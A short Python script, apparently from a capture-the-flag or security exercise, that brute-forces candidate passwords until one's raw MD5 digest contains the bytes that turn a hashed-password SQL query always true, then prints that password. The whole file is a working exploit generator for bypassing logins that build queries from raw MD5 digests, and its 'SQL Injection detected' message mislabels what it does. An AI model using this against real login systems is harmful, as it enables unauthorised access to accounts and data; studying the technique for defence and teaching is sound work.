from pymd5 import md5
  
target = b"'='"
prefix = "'="
count = 0
password = ""

while True:
    count += 1
    password = prefix + str(count)
    m = md5(password) 
    binaryData = m.digest()

    if count % 1000 == 0:
        print(f'{count} password attempts...')

    if target in binaryData:
        break

print("SQL Injection detected")
print(password)
